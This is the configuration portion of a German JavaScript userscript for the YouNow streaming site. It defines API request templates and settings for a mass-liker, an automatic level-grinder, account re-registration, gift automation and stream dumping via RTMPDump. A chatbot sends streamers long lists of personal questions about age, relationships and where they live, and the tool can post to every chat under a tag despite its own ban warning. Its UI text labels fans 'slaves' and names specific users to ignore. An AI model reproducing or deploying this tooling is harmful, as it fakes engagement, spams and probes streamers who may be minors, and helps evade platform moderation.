            "alpha-2": "MA",
            "country-code": "504"
        }, {
            "name": "Mozambique",
            "alpha-2": "MZ",
            "country-code": "508"
        }, {
            "name": "Myanmar",
            "alpha-2": "MM",
            "country-code": "104"
        }, {
            "name": "Namibia",
            "alpha-2": "NA",
            "country-code": "516"
        }, {
            "name": "Nauru",
            "alpha-2": "NR",
            "country-code": "520"
        }, {
            "name": "Nepal",
            "alpha-2": "NP",
            "country-code": "524"
        }, {
            "name": "Netherlands",
            "alpha-2": "NL",
            "country-code": "528"
        }, {
            "name": "New Caledonia",
            "alpha-2": "NC",
            "country-code": "540"
        }, {
            "name": "New Zealand",
            "alpha-2": "NZ",
            "country-code": "554"
        }, {
            "name": "Nicaragua",
            "alpha-2": "NI",
            "country-code": "558"
        }, {
            "name": "Niger",
            "alpha-2": "NE",
            "country-code": "562"
        }, {
            "name": "Nigeria",
            "alpha-2": "NG",
            "country-code": "566"
        }, {
            "name": "Niue",
            "alpha-2": "NU",
            "country-code": "570"
        }, {
            "name": "Norfolk Island",
            "alpha-2": "NF",
            "country-code": "574"
        }, {
            "name": "Northern Mariana Islands",
            "alpha-2": "MP",
            "country-code": "580"
        }, {
            "name": "Norway",
            "alpha-2": "NO",
            "country-code": "578"
        }, {
            "name": "Oman",
            "alpha-2": "OM",
            "country-code": "512"
        }, {
            "name": "Pakistan",
            "alpha-2": "PK",
            "country-code": "586"
        }, {
            "name": "Palau",
            "alpha-2": "PW",
            "country-code": "585"
        }, {
            "name": "Palestine, State of",
            "alpha-2": "PS",
            "country-code": "275"
        }, {
            "name": "Panama",
            "alpha-2": "PA",
            "country-code": "591"
        }, {
            "name": "Papua New Guinea",
            "alpha-2": "PG",
            "country-code": "598"
        }, {
            "name": "Paraguay",
            "alpha-2": "PY",
            "country-code": "600"
        }, {
            "name": "Peru",
            "alpha-2": "PE",
            "country-code": "604"
        }, {
            "name": "Philippines",
            "alpha-2": "PH",
            "country-code": "608"
        }, {
            "name": "Pitcairn",
            "alpha-2": "PN",
            "country-code": "612"
        }, {
            "name": "Poland",
            "alpha-2": "PL",
            "country-code": "616"
        }, {
            "name": "Portugal",
            "alpha-2": "PT",
            "country-code": "620"
        }, {
            "name": "Puerto Rico",
            "alpha-2": "PR",
            "country-code": "630"
        }, {
            "name": "Qatar",
            "alpha-2": "QA",
            "country-code": "634"
        }, {
            "name": "Réunion",
            "alpha-2": "RE",
            "country-code": "638"
        }, {
            "name": "Romania",
            "alpha-2": "RO",
            "country-code": "642"
        }, {
            "name": "Russian Federation",
            "alpha-2": "RU",
            "country-code": "643"
        }, {
            "name": "Rwanda",
            "alpha-2": "RW",
            "country-code": "646"
        }, {
            "name": "Saint Barthélemy",
            "alpha-2": "BL",
            "country-code": "652"
        }, {
            "name": "Saint Helena, Ascension and Tristan da Cunha",
            "alpha-2": "SH",
            "country-code": "654"
        }, {
            "name": "Saint Kitts and Nevis",
            "alpha-2": "KN",
            "country-code": "659"
        }, {
            "name": "Saint Lucia",
            "alpha-2": "LC",
            "country-code": "662"
        }, {
            "name": "Saint Martin (French part)",
            "alpha-2": "MF",
            "country-code": "663"
        }, {
            "name": "Saint Pierre and Miquelon",
            "alpha-2": "PM",
            "country-code": "666"
        }, {
            "name": "Saint Vincent and the Grenadines",
            "alpha-2": "VC",
            "country-code": "670"
        }, {
            "name": "Samoa",
            "alpha-2": "WS",
            "country-code": "882"
        }, {
            "name": "San Marino",
            "alpha-2": "SM",
            "country-code": "674"
        }, {
            "name": "Sao Tome and Principe",
            "alpha-2": "ST",
            "country-code": "678"
        }, {
            "name": "Saudi Arabia",
            "alpha-2": "SA",
            "country-code": "682"
        }, {
            "name": "Senegal",
            "alpha-2": "SN",
            "country-code": "686"
        }, {
            "name": "Serbia",
            "alpha-2": "RS",
            "country-code": "688"
        }, {
            "name": "Seychelles",
            "alpha-2": "SC",
            "country-code": "690"
        }, {
            "name": "Sierra Leone",
            "alpha-2": "SL",
            "country-code": "694"
        }, {
            "name": "Singapore",
            "alpha-2": "SG",
            "country-code": "702"
        }, {
            "name": "Sint Maarten (Dutch part)",
            "alpha-2": "SX",
            "country-code": "534"
        }, {
            "name": "Slovakia",
            "alpha-2": "SK",
            "country-code": "703"
        }, {
            "name": "Slovenia",
            "alpha-2": "SI",
            "country-code": "705"
        }, {
            "name": "Solomon Islands",
            "alpha-2": "SB",
            "country-code": "090"
        }, {
            "name": "Somalia",
            "alpha-2": "SO",
            "country-code": "706"
        }, {
            "name": "South Africa",
            "alpha-2": "ZA",
            "country-code": "710"
        }, {
            "name": "South Georgia and the South Sandwich Islands",
            "alpha-2": "GS",
            "country-code": "239"
        }, {
            "name": "South Sudan",
            "alpha-2": "SS",
            "country-code": "728"
        }, {
            "name": "Spain",
            "alpha-2": "ES",
            "country-code": "724"
        }, {
            "name": "Sri Lanka",
            "alpha-2": "LK",
            "country-code": "144"
        }, {
            "name": "Sudan",
            "alpha-2": "SD",
            "country-code": "729"
        }, {
            "name": "Suriname",
            "alpha-2": "SR",
            "country-code": "740"
        }, {
            "name": "Svalbard and Jan Mayen",
            "alpha-2": "SJ",
            "country-code": "744"
        }, {
            "name": "Swaziland",
            "alpha-2": "SZ",
            "country-code": "748"
        }, {
            "name": "Sweden",
            "alpha-2": "SE",
            "country-code": "752"
        }, {
            "name": "Switzerland",
            "alpha-2": "CH",
            "country-code": "756"
        }, {
            "name": "Syrian Arab Republic",
            "alpha-2": "SY",
            "country-code": "760"
        }, {
            "name": "Taiwan, Province of China",
            "alpha-2": "TW",
            "country-code": "158"
        }, {
            "name": "Tajikistan",
            "alpha-2": "TJ",
            "country-code": "762"
        }, {
            "name": "Tanzania, United Republic of",
            "alpha-2": "TZ",
            "country-code": "834"
        }, {
            "name": "Thailand",
            "alpha-2": "TH",
            "country-code": "764"
        }, {
            "name": "Timor-Leste",
            "alpha-2": "TL",
            "country-code": "626"
        }, {
            "name": "Togo",
            "alpha-2": "TG",
            "country-code": "768"
        }, {
            "name": "Tokelau",
            "alpha-2": "TK",
            "country-code": "772"
        }, {
            "name": "Tonga",
            "alpha-2": "TO",
            "country-code": "776"
        }, {
            "name": "Trinidad and Tobago",
            "alpha-2": "TT",
            "country-code": "780"
        }, {
            "name": "Tunisia",
            "alpha-2": "TN",
            "country-code": "788"
        }, {
            "name": "Turkey",
            "alpha-2": "TR",
            "country-code": "792"
        }, {
            "name": "Turkmenistan",
            "alpha-2": "TM",
            "country-code": "795"
        }, {
            "name": "Turks and Caicos Islands",
            "alpha-2": "TC",
            "country-code": "796"
        }, {
            "name": "Tuvalu",
            "alpha-2": "TV",
            "country-code": "798"
        }, {
            "name": "Uganda",
            "alpha-2": "UG",
            "country-code": "800"
        }, {
            "name": "Ukraine",
            "alpha-2": "UA",
            "country-code": "804"
        }, {
            "name": "United Arab Emirates",
            "alpha-2": "AE",
            "country-code": "784"
        }, {
            "name": "United Kingdom",
            "alpha-2": "GB",
            "country-code": "826"
        }, {
            "name": "United States",
            "alpha-2": "US",
            "country-code": "840"
        }, {
            "name": "United States Minor Outlying Islands",
            "alpha-2": "UM",
            "country-code": "581"
        }, {
            "name": "Uruguay",
            "alpha-2": "UY",
            "country-code": "858"
        }, {
            "name": "Uzbekistan",
            "alpha-2": "UZ",
            "country-code": "860"
        }, {
            "name": "Vanuatu",
            "alpha-2": "VU",
            "country-code": "548"
        }, {
            "name": "Venezuela, Bolivarian Republic of",
            "alpha-2": "VE",
            "country-code": "862"
        }, {
            "name": "Viet Nam",
            "alpha-2": "VN",
            "country-code": "704"
        }, {
            "name": "Virgin Islands, British",
            "alpha-2": "VG",
            "country-code": "092"
        }, {
            "name": "Virgin Islands, U.S.",
            "alpha-2": "VI",
            "country-code": "850"
        }, {
            "name": "Wallis and Futuna",
            "alpha-2": "WF",
            "country-code": "876"
        }, {
            "name": "Western Sahara",
            "alpha-2": "EH",
            "country-code": "732"
        }, {
            "name": "Yemen",
            "alpha-2": "YE",
            "country-code": "887"
        }, {
            "name": "Zambia",
            "alpha-2": "ZM",
            "country-code": "894"
        }, {
            "name": "Zimbabwe",
            "alpha-2": "ZW",
            "country-code": "716"
        }],
        languages: {
            "de-DE": {
                "langCode": "de-DE",
                "goDark": "In den Schatten!",
                "post": "Abschicken",
                "writeComment": "Kommentar schreiben...",
                "goLight": "Ins Licht!",
                "backToProfile": "Zurück zum Profil",
                "rtmpURL": "RTMP URL",
                "fans": "Sklaven",
                "usersFound": "Benutzer gefunden",
                "numberSeperator": ".",
                "trendingPeople": "Besonders bedürftig",
                "editorsPick": "Auserwählte",
                "friends": "Verfolgte",
                "trendingTags": "Erbärmliche Tags",
                "streamerOffline": "%1 ist offline.",
                "in": " in ",
                "account": "Account",
                "minChatLevel": "Zum Chatten ist Level %1 benötigt",
                "writeInChat": "In den Chat",
                "writeInTrending": "In alle Chats des aktuellen Tags",
                "writeInTag": "In alle Chats des Tags:",
                "chatWarning": "Mit großer Macht kommt große Verantwortung, junger Padawan. \nNutze die Macht weise. \nACHTUNG!: Banngefahr.",
                "audience": "Zuschauer",
                "chat": "Chat",
                "infos": "Streamer-Info",
                "remove": "Löschen",
                'age': 'Alter',
                'barsEarned': 'Bars verdient',
                'coins': 'Coins',
                'maxLikes': 'Maximal erreichte Likes',
                'country': 'Land',
                'partner': 'Partnerstatus',
                'level': 'Level',
                'device': 'Gerät',
                'displayViewers': 'Desktop-Zuschauer',
                'mobileViewers': 'Mobil-Zuschauer',
                'maxViewers': 'Höchste Zuschauerzahl',
                'points': 'Punkte',
                'tag': 'Tag',
                'position': 'Position',
                'reconnects': 'Reconnects',
                'featuredTime': 'Zeit gefeatured',
                'giftsValue': 'Wert aller Geschenke',
                'newFans': 'Neue Sklaven',
                'bitrate': 'Bitrate (kbps)',
                'copy': 'Kopieren',
                'massLike': 'Massenlike',
                'massLikeCost': 'Maximale Kosten',
                'fps': 'FPS',
                'levelNeeded': '%1 bis Level %2',
                'streamURL': 'Stream URL',
                'partnerStatus': ["Kein Partner", "Partner", "Anwärter"],
                'osVersion': 'Betriebssystem',
                'connection': 'Verbindung',
                'provider': 'Serviceprovider',
                'browser': 'Browser',
                'toLive': 'Zum Livestream',
                'nobodyLikesDragon': 'Niemand mag Drache',
                'commandCentral': 'Kommando-Zentrale',
                'chatbotEnabled': 'Chatbot aktivieren.',
                'nextMessageIn': 'Nächste Nachricht in:',
                'chatBotMessage': 'Nachrichten',
                'chatBotIgnored': 'Ignorierte Nutzer',
                'chatBotInterval': 'Interval',
                'chatBot': 'Chatbot',
                'waitForMassLike': 'Bitte warte %1',
                'likesGiven': '%1 Likes gegeben.',
                'dontChange': 'Nicht ändern, falls die Auswirkung nicht bekannt ist',
                'massLikerEnabled': 'Massenliker aktivieren',
                'likeThreshold': 'Likeschwelle',
                'loginWith': 'Login mit',
                'level': 'Level',
                'leveling': 'Levelt...',
                'leveller': 'Leveller',
                'desiredLevel': 'Gewünschtes Level',
                'levellerActive': 'Leveller aktivieren',
                'relog': 'Neu einloggen',
                'logout': 'Ausloggen...',
                'waitForLogout': 'Warten auf ausloggen...',
                'login': ' Einloggen...',
                'rtmpDump': 'RTMPDump Befehl anzeigen',
                'waitForLogin': 'Warten auf einloggen...',
                'waiting': 'Warte...',
                'sendingRequests': 'Anfragen werden verschickt.',
                'liking': 'Liebe verteilen',
                'fetchingUsers': 'Nutzer werden gesucht.',
                'givenLikes': 'Gegebene Likes',
                'givenLikesRound': 'Likes in dieser Runde',
                'usersCount': 'Gefundene Nutzer',
                'uniqueUsers': 'Einmalige Nutzer',
                'logins': 'Logins',
                'massLikerStats': 'Statistiken',
                'currentTask': 'Derzeitige Aufgabe:',
                'runningTime': 'Laufzeit',
                'likesPerSecond': 'Likes pro Sekunde',
                'currentRound': 'Runde',
                'currentRoundTime': 'Rundenzeit',
                'spentCoins': 'Ausgegebene Coins',
                'spentHearts': 'Verschickte Herzen',
                'spentHundredLikes': 'Verschickte 100x Likes',
                'love': 'Lieeebeee',
                'sending': 'Verschicken',
                'gifting': 'Bescherung',
                'check': 'Prüfen...',
                'keepCoins': 'Hohe Kante',
                'giftThreshold': 'Bescherung ab',
                'ignoreUsers': 'Unartige User',
                'giveGifts': 'Bescherung',
                'renaming': 'Umbenennen...',
                'massLikerAlternative': 'Alternativer Suchmodus',
                'intervalLikes': 'Max. Likes',
                'interval': 'Pro',
                'finished': 'Fertig.',
                'recreateAccount': 'Neu registrieren',
                'userList': 'Benutzer',
                'massLiker': 'Massenliker',
                'broadcastsCount': 'Streams bisher',
                'location': 'Standort',
                'points': 'Punkte',
                'dateCreated': 'Erstelldatum',
                'fan': 'Fan werden',
                'unfan': 'Fan entfernen',
                'dashboard': 'Pinnwand',
                'fanOf': 'Von %1 Sklave',
                'fansTab': '%1 Sklaven',
                'previousBroadcasts': 'Streams',
                'unlike': 'Gefällt mir nicht mehr!',
                'like': 'Gefällt mir!',
                'otherLikes': ' - %1 Andere(n) gefällt das!',
            }
        },
        deviceMapping: {
            'iPad1,1': 'iPad 1 Wi-Fi/3G/GPS',
            'iPad2,1': 'iPad 2 Wi-Fi Only',
            'iPad2,2': 'iPad 2 Wi-Fi/GSM/GPS',
            'iPad2,3': 'iPad 2 WiFi/CDMA/GPS',
            'iPad2,4': 'iPad 2 Wi-Fi Only',
            'iPad3,1': 'iPad 3 Wi-Fi Only',
            'iPad3,2': 'iPad 3 Wi-Fi/GPS/Cellular Verizon ',
            'iPad3,3': 'iPad 3 Wi-Fi/GPS/Cellular AT&T',
            'iPad3,4': 'iPad 4 Wi-Fi Only',
            'iPad3,5': 'iPad 4 Wi-Fi/GPS AT&T',
            'iPad3,6': 'iPad 4 Wi-Fi/GPS Verizon/Sprint',
            'iPad2,5': 'iPad mini 1 Wi-Fi Only',
            'iPad2,6': 'iPad mini 1 Wi-Fi/GPS AT&T',
            'iPad2,7': 'iPad mini 1 Wi-Fi/GPS Verizon/Sprint',
            'iPad4,1': 'iPad Air Wi-Fi Only',
            'iPad4,2': 'iPad Air Wi-Fi/Cellular',
            'iPad4,3': 'iPad Air Wi-Fi/TD-LTE China',
            'iPad4,4': 'iPad mini 2 Wi-Fi Only',
            'iPad4,5': 'iPad mini 2 Wi-Fi/Cellular',
            'iPad4,6': 'iPad mini 2 China',
            'iPad5,3': 'iPad Air 2 Wi-Fi Only',
            'iPad5,4': 'iPad Air 2 Wi-Fi/Cellular',
            'iPad4,7': 'iPad mini 3 Wi-Fi Only',
            'iPad4,8': 'iPad mini 3 Wi-Fi/Cellular',
            'iPhone1,1': 'iPhone 1',
            'iPhone1,2': 'iPhone 3G',
            'iPhone2,1': 'iPhone 3GS',
            'iPhone1,2*': 'iPhone 3G China No Wi-Fi',
            'iPhone2,1*': 'iPhone 3GS China No Wi-Fi',
            'iPhone3,1': 'iPhone 4 GSM',
            'iPhone3,3': 'iPhone 4 CDMA/Verizon/Sprint',
            'iPhone4,1': 'iPhone 4s',
            'iPhone4,1*': 'iPhone 4s China',
            'iPhone5,1': 'iPhone 5',
            'iPhone5,2': 'iPhone 5',
            'iPhone5,3': 'iPhone 5c',
            'iPhone5,4': 'iPhone 5c',
            'iPhone6,1': 'iPhone 5s',
            'iPhone6,2': 'iPhone 5s',
            'iPhone7,2': 'iPhone 6',
            'iPhone7,2*': 'iPhone 6 China',
            'iPhone7,1': 'iPhone 6 Plus',
            'iPhone7,1*': 'iPhone 6 Plus China',
            'NT 10.0': '10',
            'NT 6.3': '8.1',
            'NT 6.2': '8',
            'NT 6.1': '7',
            'NT 6.0': 'Vista',
            'NT 5.2': 'XP x64',
            'NT 5.1': 'XP x86',
            'samsung SM-G800F': 'Samsung Galaxy S5 Mini',
            'samsung SM-G920F': 'Samsung Galaxy S6',
            'samsung SM-G900F': 'Samsung Galaxy S5',
            'samsung GT-I9505': 'Samsung Galaxy S4',
            'samsung SM-A300FU': 'Samsung Galaxy A3',
            'samsung GT-I9305': 'Samsung Galaxy S3',
            'samsung GT-I9100': 'Samsung Galaxy S2',
            'samsung GT-I9000': 'Samsung Galaxy S1',
            'samsung GT-I8190': 'Samsung Galaxy S3 mini',
            'LGE LG-D373': 'LG L80',
            'HUAWEI G7-L01': 'Huawei Ascend G7',
        },
        ignoreRouting: false,
        maxMessages: 200,
        leveller: {
            desiredLevel: 11 + Math.floor(Math.random() * 4),
            active: false,
            levelCap: 15, // DO NOT TOUCH THIS. THIS IS YOUR LAST WARNING! STEP OFF!
        },
        massLiker: {
            maxLikeCost: 5,
            likeThreshold: 800,
            active: false,
            login: "twitter",
            giftThreshold: 200000,
            keepCoins: 10000,
            interval: 1,
            intervalLikes: 1,
            giveGifts: true,
            ignoreUsers: [
                "drachenlord_offiziell",
                "braui.93",
                "anku",
            ],
        },
        ticks: {
            massLike: 100,
            trending: 5000,
            onlineFriends: 5000,
            routing: 100,
            reloadStreamData: 5000,
            updateStreamData: 1000,
            reloadTagTrending: 5000,
            updateViewers: 5000,
            design: 100,
            recreater: 100,
            animation: 20,
            leveller: 100,
        },
        chatbot: {
            timeRemaining: 2 * 60 * 1000,
            interval: 2 * 60 * 1000,
            active: false,
            tag: "deutsch",
            knownIdiots: [
                "braui.93",
            ],
            messages: [
                "Was für Musik hörst du so?",
                "Was hast du heute schon so gemacht?",
                "Was sind deine Hobbies?",
                "Woher kommst du eigentlich?",
                "Wie alt bist du?",
                "Wann streamst du immer?",
                "Was ist dein Lieblingsurlaubsland?",
                "Wo hast du zuletzt Urlaub gemacht?",
                "Magst du Einhörner?",
                "Welches ist dein Lieblingseis?",
                "Was ist dein Lieblingslied?",
                "Magst du Pferde?",
                "Mir ist langweilig :(",
                "Wie heißt du?",
                "Hast du Geschwister?",
                "Wo wurdest du geboren?",
                "Wann hast du das letzte mal geduscht?",
                "Welche Farbe hat dein Schreibtisch?",
                "Bist du froh mit deinem Geschlecht?",
                "Was ist der romantischste Platz für ein Rendesvouz?",
                "Bist du gerade verliebt?",
                "Was war der letzte Film, den du gesehen hast?",
                "Wenn du Kreide wärst, welche Farbe hättest du?",
                "Was ist der seltsamste Name, den du je gehört hast?",
                "Welches Buch hast du als letztes gelesen?",
                "Wenn du einen Tag Weltherrscher wärst, was würdest du ändern?",
                "Was ist dein Lieblingsspruch?",
                "Welches Handy hast du?",
                "Wie ist das Wetter gerade?",
                "Was hast du letzte Nacht gemacht?",
                "Was sind deine Lieblingsfilme?",
                "Was ist dein Lieblingsessen?",
                "Was trinkst du am liebsten?",
                "Welchen Alkohol magst du am meisten?",
                "Was hast du als Bildschirmhintergrund?",
                "Glaubst du an Liebe auf den ersten Blick?",
                "Was isst du immer zum Frühstück?",
                "Wieviele Kinder willst du mal haben?",
                "Was ist deine Lieblings-Fernsehserie?",
                "Glaubst du an den Himmel?",
                "Glaubst du an Wunder?",
                "Mit wievielen Kissen schläfst du?",
                "Was ist dein Lieblingssport?",
                "Was ist dein Lieblingszitat?",
                "Was ist das Wichtigste für dich im Leben?",
                "Was ist unter deinem Bett?",
                "Was ist dein Lieblingstier?",
                "Warst du schonmal auf einem Konzert?",
                "Warst du schon einmal im Krankenhaus?",
                "Was ist dein Traumberuf?",
                "Welchen Promi würdest du gerne einmal kennenlernen?",
                "Was ist deine Lieblings Website?",
                "Was ist dein Lieblingsauto?",
                "Wann war dein erster Kuss?",
                "Bist du zufrieden mit deinem Leben?",
                "Welche Augenfarbe magst du am meisten?",
                "Rauchst du?",
                "Was war dein schönster Traum?",
                "Wovor hast du am meisten Angst?",
                "Welche 3 Dinge würdest du auf eine einsame Insel mitnehmen?",
                "Bist du ein Sommer oder Wintermensch?",
                "Was ist deine Lieblingsfarbe?",
                "Was sind deine Wünsche für die Zukunft?",
                "Geld oder Liebe?",
                "Hast du Spitznamen?",
                "Herr der Ringe oder Harry Potter?",
                "Bist du mit der Regierung zufrieden?",
                "Liest du Zeitung?",
                "Glaubst du an Geister?",
                "Glaubst du an Übernatürliches?",
                "Hast du ein Vorbild?",
                "Wie würdest du dich in einem Satz beschreiben?",
                "Wir würdest du deine Tochter nennen?",
                "Wie würdest du deinen Sohn nennen?",
                "McDonalds oder Burger King?",
                "Hast du eine Glückszahl?",
                "Ist das Glas halb voll oder halb leer?",
                "Apfel oder Pfirsich?",
                "Mars oder Twixx?",
                "Vampir oder Werwolf?",
                "Wie kommt das \"Nicht betreten\" Schild auf den Rasen?",
                "Welchen Ton hat dein Wecker?",
                "Hast du Macken?",
                "Wie würdest du gerne heißen?",
                "Für was gibst du das meiste Geld aus?",
                "Hast du Facebook?",
                "Hast du Instagram?",
                "Hast du Twitter?",
                "Hast du einen YouTube Kanal?",
                "Hast du einen Hund?",
                "Hast du eine Katze?",
                "Hat es bei dir heute geregnet?",
                "Gehst du ins Fitnessstudio?",
                "Lebst du vegan?",
                "Magst du Kinder?",
                "Magst du Bier?",
                "Willst du später heiraten?",
                "Welches Shampoo verwendest du?",
                "Knoblauch oder Zwiebeln?",
                "In welchen Städten warst du schon?",
                "Bist du eher gut oder böse?",
                "Bist du brav oder rebellisch?",
                "Wieviele Lagen hat euer Toilettenpapier?",
                "Bist du tollpatschig?",
                "Bist du spontan?",
                "Erzähl mal einen Witz!",
                "Bist du Rechts- oder Linkshänder?",
                "Was war zuerst da? Das Huhn oder das Ei?",
                "Achtest du sehr auf Rechtschreibung?",
                "Zeichnest du gerne?",
                "Spielst du ein Musikinstrument?",
                "Hattest du Latein in der Schule?",
                "Wie definierst du Liebe?",
                "Cola oder Fanta?",
                "Bist du ein Land- oder Stadtmensch?",
                "Wie findest du die Simpsons?",
                "Kennst du Futurama?",
                "Spaghetti oder Pizza?",
                "Welches Parfüm verwendest du?",
                "Was hältst du von Religionen?",
                "Gehst du lieber ins Schwimmbad oder an den See?",
                "Was für ein Deo verwendest du?",
                "Hast du irgendwelche Allergien?",
                "Welcher Sport sollte deiner Meinung nach Nationalsport werden?",
                "Was war das verrückteste, was du je getan hast?",
                "Wie groß ist dein Zimmer?",
                "Wie willst du beerdigt werden?",
                "Wenn du einen Wunsch freihättest, welcher wäre das?",
                "Wie würdest du dich selbst beschreiben?",
                "Hast du Flugangst?",
                "Duscht oder badest du lieber?",
                "Wie lang sind deine Haare?",
                "Wie groß bist du?",
                "Kannst du ohne dein Handy leben?",
                "Was ist deine Lieblingsband?",
                "Kannst du Ski fahren?",
                "Kannst du Snowboarden?",
                "Fährst du Longboard?",
                "Wo siehst du dich in 10 Jahren?",
                "Wo siehst du dich in 20 Jahren?",
                "Was tust du, wenn du im Lotto gewinnst?",
                "Wie gut ist dein Gedächtnis?",
                "Bist du ein Nachtmensch?",
                "Bist du Frühaufsteher oder Langschläfer?",
                "Hast du Angst vorm Tod?",
                "Wer ist dein Lieblings-Comedian?",
                "Isst du gerne Fisch?",
                "Grillst du gerne?",
                "Wieso ist die Banane krumm?",
                "Hast du einen Partner?",
                "Hast du dir schonmal die Haare gefärbt?",
                "Welcher Dino wärst du?",
                "Magst du Züge?",
                "Was hast du für Haustiere?",
                "Was hast du für einen PC?",
                "Kannst du gut Kochen?",
                "Was ist dein Lieblingsbrettspiel?",
                "Gehst du auf die Gamescom?",
                "Wen bewunderst du am meisten?",
                "Was würdest du dir mit einer Million Euro kaufen?",
                "Was ist dein Lieblingsbild?",
                "Was war das letzte was du dir gekauft hast?",
                "Wann warst du das letzte mal bei McDonalds?",
                "Wann warst du das letzte mal bei Burger King?",
                "Was ist dein Lieblings-Videospiel?",
            ],
        },
        requestSettings: {
            likeObject: {
                url: "$BASE/php/api/post/like",
                method: "POST",
                requestBy: true,
                addIdentification: true,
                pusherSocket: true,
                data: {
                    userId: "$USERID",
                    channelId: "%channelID",
                    id: "%objectID",
                    isComment: "%isComment",
                }
            },
            unlikeObject: {
                url: "$BASE/php/api/post/unlike",
                method: "POST",
                requestBy: true,
                addIdentification: true,
                pusherSocket: true,
                data: {
                    userId: "$USERID",
                    channelId: "%channelID",
                    id: "%objectID",
                    isComment: "%isComment",
                }
            },
            'fan': {
                url: "$BASE/php/api/channel/fan",
                method: "POST",
                requestBy: true,
                addIdentification: true,
                data: {
                    userId: "$USERID",
                    channelId: "%channelID",
                }
            },
            'unfan': {
                url: "$BASE/php/api/channel/unFan",
                method: "POST",
                requestBy: true,
                addIdentification: true,
                data: {
                    userId: "$USERID",
                    channelId: "%channelID",
                }
            },
            'sendChatMessage': {
                url: "https://www.younow.com/php/api/broadcast/chat",
                requestBy: true,
                method: "POST",
                addIdentification: true,
                data: {
                    userId: "$USERID",
                    channelId: "%channelID",
                    comment: "%message",
                }
            },
            'sendGift': {
                url: "https://www.younow.com/php/api/broadcast/gift",
                requestBy: true,
                method: "POST",
                addIdentification: true,
                data: {
                    userId: "$USERID",
                    channelId: "%channelID",
                    giftId: "%giftID",
                    quantity: "%quantity",
                },
            },
            'getTrending': {
                url: "https://cdn2.younow.com/php/api/younow/dashboard/locale=de/trending=%count",
            },
            'getViewers': {
                url: "$CDNBASE/php/api/broadcast/audience/channelId=%channelID/numOfRecords=%count/start=%start",
            },
            'getPlayData': {
                url: "%playDataURL%userID.json",
                dataType: "json",
            },
            'likeBroadcast': {
                url: "$BASE/php/api/broadcast/like",
                addIdentification: true,
                requestBy: true,
                method: "POST",
                data: {
                    channelId: "%channelID",
                    userId: "$USERID",
                },
            },
            'getVideoPath': {
                url: "https://cdn2.younow.com/php/api/broadcast/videoPath/broadcastId=%broadcastID",
            },
            'searchPeople': {
                url: "https://qz0xcgubgq.algolia.io/1/indexes/$PEOPLESEARCHINDEX/query",
                addAlgolia: true,
                method: "POST",
                data: '{"params":"query=%query&hitsPerPage=%perPage&page=%page&attributesToHighlight=none"}',
            },
            'searchTag': {
                url: "https://qz0xcgubgq.algolia.io/1/indexes/$PEOPLESEARCHINDEX/query",
                addAlgolia: true,
                method: "POST",
                data: '{"params":"query=%query&hitsPerPage=%perPage&page=%page&attributesToHighlight=none&restrictSearchableAttributes=tag"}',
            },
            'trendingUsers': {
                url: "$CDNBASE/php/api/younow/trendingUsers/numberOfRecords=%count/startFrom=%startFrom/locale=ww",
            },
            'getFriends': {
                url: "$BASE/php/api/channel/getLocationOnlineFansOf/numberOfRecords=50/channelId=$USERID"
            },
            'getProfile': {
                url: "$CDNBASE/php/api/channel/getInfo/channelId=%channelID",
            },
            'isFan': {
                url: "$BASE/php/api/channel/isFanOf/userId=$USERID/channelIds=%userID",
            },
            'getBroadcast': {
                url: "$BASE/php/api/broadcast/info/curId=0/user=%username",
            },
            'getFansOf': {
                url: "$BASE/php/api/channel/getFansOf/channelId=%channelID/startFrom=%startFrom",
            },
            'getFans': {
                url: "$BASE/php/api/channel/getFans/channelId=%channelID/startFrom=%startFrom",
            },
            'getPreviousBroadcasts': {
                url: "$BASE/php/api/post/getBroadcasts/channelId=%channelID/startFrom=%startFrom/userId=$USERID",
            },
            'getPosts': {
                url: "$BASE/php/api/post/get/channelId=%channelID/startFrom=%startFrom/userId=$USERID",
            },
            'deletePost': {
                url: "$BASE/php/api/post/delete",
                addIdentification: true,
                requestBy: true,
                method: "POST",
                data: {
                    isComment: "%isComment",
                    channelId: "%channelID",
                    userId: "$USERID",
                    id: "%postID",
                }
            },
            'createPost': {
                url: "$BASE/php/api/post/create",
                addIdentification: true,
                requestBy: true,
                method: "POST",
                multipart: true,
                data: {
                    "doEnrich": "1",
                    "userId": "$USERID",
                    "channelId": "%channelID",
                    "parentId": "%parentID",
                    "post": "%post",
                }
            }
        },
    };

    WebFontConfig = {
        google: {
            families: ['Shadows+Into+Light::latin']
        },
        active: function() {
            var o = 0.0;
            ab = setInterval(function() {
                o += 0.05;
                if (o >= 1) {
                    o = 1;
                    clearInterval(ab);
                }
                document.getElementById("darkModeLoaderLabel").style.opacity = o;
            }, 20);
        }
    };
    (function() {
        var wf = document.createElement('script');
        wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
            '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
        wf.type = 'text/javascript';
        wf.async = 'true';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(wf, s);

    })();


    // rerouting if in user is in dark mode
    if (window.localStorage.getItem("inDarkMode") == "1") {
        if (window.location.href != "https://www.younow.com/explore/") {
            //window.history.pushState({"html":"","pageTitle":""},"", "https://www.younow.com/explore");
            window.location.href = "https://www.younow.com/explore/";
            window.localStorage.setItem("browse", window.location.href.replace("https://www.younow.com/", "").replace("hidden/", ""));
        }
    }


    function startDarkMode() {
        var css = '.btn-primary { width: auto !important; } ' +
            '#darkModeLoader { background: #000 url(https://absolutehacks.com/forum/uploads/profile/photo-1.gif) center center no-repeat; width: 100%; height: 100%; top: 0px; left: 0px; position: absolute; z-index:100000; }' +
            '#darkModeLoader span {display: block; position: absolute; top: calc(50% + 80px); transform: translateY(-50%); width: 100%; font-size: 30px; color:#aaa; text-align: center; font-family: \'Shadows Into Light\', cursive;}';
        var darkModeLoader = null;
        if (window.localStorage.getItem("inDarkMode") == "1") {
            css += 'body, html {background: #000; overflow: hidden;font-family: Segoe UI; }' +
                '.navbar {border-bottom: 0px;background: #666; border-bottom: 1px solid #777 !important;}' +
                '.nav-logo {float: left; width: 110px; margin-left: 10px; margin-right: 80px !important; }' +
                '.navbar-content {width: 100% !important;min-width:0px !important; max-width: 100000px !important;}' +
                'select, input[type=text], input[type=number], textarea {background:#333; font-size:11px; font-family: Segoe UI; color: #ddd !important; border: 1px solid #666;}' +
                '#darkPage #left li {width: 100%; overflow: hidden;}' +
                '#previousStream {width: 100%; height:100%;}' +
                '#previousStream .header {width: 100%; height:30px; background: #333; border-bottom: 1px solid #555;}' +
                '#previousStream .header a, #previousStream .header span {float: left; width: auto; border-right: 1px solid #555; text-decoration:none; font-weight:bold; color:#ddd; height:30px; padding-top: 5px; padding-left: 10px; padding-right: 10px;}' +
